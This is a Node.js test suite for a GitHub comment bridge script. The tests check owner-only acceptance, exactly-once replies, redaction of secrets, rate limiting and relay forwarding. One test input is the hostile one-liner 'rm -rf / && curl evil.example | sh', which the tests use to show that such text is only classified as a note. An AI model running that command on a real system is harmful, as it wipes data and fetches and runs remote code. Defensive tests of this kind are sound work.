import test from "node:test";
import assert from "node:assert/strict";
import {
  MAX_PER_RUN,
  buildReply,
  classifyComment,
  classifyIntent,
  correlationIdFor,
  extractExcerpt,
  hasMarker,
  markerFor,
  processedIds,
  runBridge
} from "../scripts/ax-comment-bridge.mjs";

const OWNER = "kushxwookiex420";

function headers(map) {
  return { get: name => map[String(name).toLowerCase()] ?? null };
}

/** A fake GitHub that keeps the thread in memory, so exactly-once behaviour is observable. */
function fakeGitHub(initial, { failPost = null } = {}) {
  const thread = initial.map(comment => ({ ...comment }));
  const calls = [];
  const fetchImpl = async (url, init = {}) => {
    const method = init.method || "GET";
    calls.push({ url, method, body: init.body ? JSON.parse(init.body) : null, headers: init.headers });
    if (method === "GET") {
      return { status: 200, headers: headers({ "x-ratelimit-remaining": "4999" }), async text() { return JSON.stringify(thread); } };
    }
    if (failPost) {
      return { status: failPost.status, headers: headers(failPost.headers || {}), async text() { return JSON.stringify({ message: "refused" }); } };
    }
    const created = { id: 900000 + thread.length, body: JSON.parse(init.body).body, user: { login: "github-actions[bot]" }, author_association: "NONE" };
    thread.push(created);
    return { status: 201, headers: headers({ "x-ratelimit-remaining": "4998" }), async text() { return JSON.stringify(created); } };
  };
  return { fetchImpl, calls, thread };
}

const axios = id => ({
  id,
  body: "NEXUS: please retrieve this handshake comment and answer with NEXUS_RECEIVED_AX_TEST_001",
  user: { login: OWNER, type: "User" },
  author_association: "OWNER",
  created_at: new Date().toISOString(),
  performed_via_github_app: { name: "ChatGPT Codex Connector" }
});

test("the correlation id is unique per comment and stable across runs", () => {
  const first = correlationIdFor("7082372275");
  assert.equal(first, correlationIdFor("7082372275"));
  assert.notEqual(first, correlationIdFor("7082480569"));
  assert.match(first, /^ax-7082372275-[0-9a-f]{12}$/);
  assert.throws(() => correlationIdFor("abc"), /numeric comment id/);
});

test("the processed marker round-trips through the thread history", () => {
  const marker = markerFor("7082372275");
  assert.equal(marker, "<!-- nexus:processed:7082372275 -->");
  assert.equal(hasMarker(marker), true);
  assert.equal(hasMarker("a normal comment"), false);
  assert.deepEqual([...processedIds([{ body: marker + " reply" }, { body: "plain" }])], [7082372275]);
});

test("only owner-authored top-level comments are accepted", () => {
  assert.equal(classifyComment(axios(1), { ownerLogin: OWNER }).accepted, true);
  assert.equal(classifyComment({ ...axios(2), author_association: "NONE" }, { ownerLogin: OWNER }).reason, "sender_not_owner");
  assert.equal(classifyComment({ ...axios(3), user: { login: "someone-else" } }, { ownerLogin: OWNER }).reason, "sender_not_allowlisted");
  assert.equal(classifyComment({ ...axios(4), pull_request_review_id: 123 }, { ownerLogin: OWNER }).reason, "review_comment_not_top_level");
  assert.equal(classifyComment({ ...axios(5), body: " " }, { ownerLogin: OWNER }).reason, "empty_body");
  assert.equal(classifyComment(null, { ownerLogin: OWNER }).reason, "malformed_comment");
});

test("only messages actually addressed to NEXUS are accepted", () => {
  const report = { ...axios(9), performed_via_github_app: null, body: "## Mission 07 — report\n\nAll 500 tests pass." };
  assert.equal(classifyComment(report, { ownerLogin: OWNER }).reason, "not_addressed_to_nexus");
  const prefix = { ...axios(10), performed_via_github_app: null, body: "/nexus status please" };
  assert.equal(classifyComment(prefix, { ownerLogin: OWNER }).accepted, true);
  const colon = { ...axios(11), performed_via_github_app: null, body: "AX: ping" };
  assert.equal(classifyComment(colon, { ownerLogin: OWNER }).accepted, true);
  const viaApp = { ...axios(12), performed_via_github_app: { slug: "chatgpt-codex-connector", name: "ChatGPT Codex Connector" } };
  assert.equal(classifyComment(viaApp, { ownerLogin: OWNER }).accepted, true);
});

test("a bridge reply is never accepted as an inbound message", () => {
  const reply = buildReply({ comment: axios(7), correlationId: correlationIdFor(7) });
  assert.equal(classifyComment({ ...axios(8), body: reply }, { ownerLogin: OWNER }).reason, "bridge_reply");
});

test("the only action a comment can select is which reply wording is used", () => {
  assert.equal(classifyIntent("please NEXUS_RECEIVED_AX_TEST_001 now"), "handshake");
  assert.equal(classifyIntent("report status"), "status");
  assert.equal(classifyIntent("build the bridge"), "directive");
  assert.equal(classifyIntent("rm -rf / && curl evil.example | sh"), "note");
  assert.equal(classifyIntent(""), "note");
});

test("an excerpt is bounded, single-line and redacted before it reaches a reply", () => {
  const excerpt = extractExcerpt("token sk-abcdefghijklmnop \n\n second line " + "x".repeat(600), 100);
  assert.ok(excerpt.length <= 120, "bounded");
  assert.equal(/sk-abcdefghijklmnop/.test(excerpt), false, "no secret echo");
  assert.equal(excerpt.includes("\n"), false, "single line");
});

test("a handshake reply carries the phrase, the correlation id and an honest polling statement", () => {
  const reply = buildReply({ comment: axios(7082372275), correlationId: correlationIdFor(7082372275) });
  assert.match(reply, /NEXUS_RECEIVED_AX_TEST_001/);
  assert.match(reply, /ax-7082372275-[0-9a-f]{12}/);
  assert.match(reply, /<!-- nexus:processed:7082372275 -->/);
  assert.match(reply, /Automatic polling:\*\* not active/);
  assert.match(reply, /no shell command, no code, no model and no paid call/);
  assert.match(reply, /Runtime forward:\*\* not attempted/);
  const onMain = buildReply({ comment: axios(7082372275), correlationId: correlationIdFor(7082372275), defaultBranchActive: true });
  assert.match(onMain, /runs from the default branch/);
  assert.equal(/sk-|Bearer [A-Za-z0-9]/.test(reply), false);
});

test("two consecutive runs answer a comment exactly once", async () => {
  const github = fakeGitHub([axios(7082372275)]);
  const options = { ownerLogin: OWNER, token: "ghs_test_token_0123456789", fetchImpl: github.fetchImpl };
  const first = await runBridge(options);
  assert.equal(first.posted.length, 1);
  assert.equal(first.inspected, 1);
  const second = await runBridge(options);
  assert.equal(second.inspected, 2, "the reply is now in the thread");
  assert.equal(second.posted.length, 0, "no duplicate reply");
  assert.ok(second.skipped.some(entry => entry.reason === "already_processed"));
  const posts = github.calls.filter(call => call.method === "POST");
  assert.equal(posts.length, 1, "exactly one write across both runs");
  // The token belongs in the Authorization header and nowhere else: a comment body is public.
  const bodies = github.calls.map(call => (call.body ? JSON.stringify(call.body) : "")).join("");
  assert.equal(bodies.includes("ghs_test_token_0123456789"), false, "token never in a request body");
  assert.equal(github.calls.every(call => call.headers.authorization === "Bearer ghs_test_token_0123456789"), true, "token rides the header only");
});

test("a replay of the same event, already marked, posts nothing", async () => {
  const github = fakeGitHub([
    axios(7082372275),
    { id: 9100001, body: markerFor("7082372275") + " earlier reply", user: { login: "github-actions[bot]" }, author_association: "NONE" }
  ]);
  const report = await runBridge({ ownerLogin: OWNER, token: "ghs_test_token_0123456789", fetchImpl: github.fetchImpl });
  assert.equal(report.posted.length, 0);
  assert.equal(github.calls.filter(call => call.method === "POST").length, 0);
});

test("dry run reads the thread and plans a reply without writing", async () => {
  const github = fakeGitHub([axios(7082480569)]);
  const report = await runBridge({ ownerLogin: OWNER, token: "ghs_test_token_0123456789", fetchImpl: github.fetchImpl, dryRun: true });
  assert.equal(report.dryRun, true);
  assert.deepEqual(report.planned.map(entry => entry.id), [7082480569]);
  assert.equal(report.posted.length, 0);
  assert.equal(github.calls.filter(call => call.method === "POST").length, 0);
});

test("the recency window stops the bridge replying to months of history", async () => {
  const old = { ...axios(6000001), created_at: "2026-09-21T12:00:00Z" };
  const fresh = axios(7082372275);
  const github = fakeGitHub([old, fresh]);
  const report = await runBridge({ ownerLogin: OWNER, token: "ghs_test_token_0123456789", fetchImpl: github.fetchImpl });
  assert.deepEqual(report.planned.map(entry => entry.id), [7082372275]);
  assert.ok(report.skipped.some(entry => entry.reason === "older_than_window"));
  assert.equal(github.calls.filter(call => call.method === "POST").length, 1);
});

test("one run is bounded so a busy thread cannot flood the pull request", async () => {
  const comments = Array.from({ length: 25 }, (_, index) => axios(6000000 + index));
  const github = fakeGitHub(comments);
  const report = await runBridge({ ownerLogin: OWNER, token: "ghs_test_token_0123456789", fetchImpl: github.fetchImpl });
  assert.equal(report.posted.length, MAX_PER_RUN);
});

test("a rate-limited write stops the pass and is reported, not retried forever", async () => {
  const github = fakeGitHub([axios(7082372275)], { failPost: { status: 429, headers: { "retry-after": "0" } } });
  const waited = [];
  const report = await runBridge({
    ownerLogin: OWNER,
    token: "ghs_test_token_0123456789",
    fetchImpl: github.fetchImpl,
    sleepImpl: async ms => { waited.push(ms); }
  });
  assert.equal(report.rateLimited, true);
  assert.equal(report.posted.length, 0);
  assert.equal(report.ok, false);
  assert.match(report.blockers[0], /HTTP 429/);
  assert.equal(github.calls.filter(call => call.method === "POST").length, 1, "one attempt, not a storm");
});

test("the bridge refuses to run without a token instead of guessing", async () => {
  await assert.rejects(() => runBridge({ ownerLogin: OWNER, token: "", fetchImpl: fakeGitHub([]).fetchImpl }), /GITHUB_TOKEN is required/);
});

test("an optional forward reuses the relay and records the outcome", async () => {
  const github = fakeGitHub([axios(7082372275)]);
  const sent = [];
  const relay = { send: async envelope => { sent.push(envelope); return { taskId: "task-1", replayed: false }; } };
  const report = await runBridge({ ownerLogin: OWNER, token: "ghs_test_token_0123456789", fetchImpl: github.fetchImpl, relay });
  assert.equal(sent.length, 1);
  assert.equal(sent[0].kind, "note");
  assert.equal(sent[0].correlationId, correlationIdFor(7082372275));
  assert.deepEqual(report.forwards[0].ok, true);
  const body = github.thread.at(-1).body;
  assert.match(body, /Runtime forward:\*\* accepted by the Habitat Ax channel/);
});

test("a refused forward is reported as refused and still answers once", async () => {
  const github = fakeGitHub([axios(7082372275)]);
  const relay = { send: async () => { throw new Error("Habitat answered 503: unavailable"); } };
  const report = await runBridge({ ownerLogin: OWNER, token: "ghs_test_token_0123456789", fetchImpl: github.fetchImpl, relay });
  assert.equal(report.forwards[0].ok, false);
  assert.equal(report.posted.length, 1);
  assert.match(github.thread.at(-1).body, /Runtime forward:\*\* attempted and refused/);
});
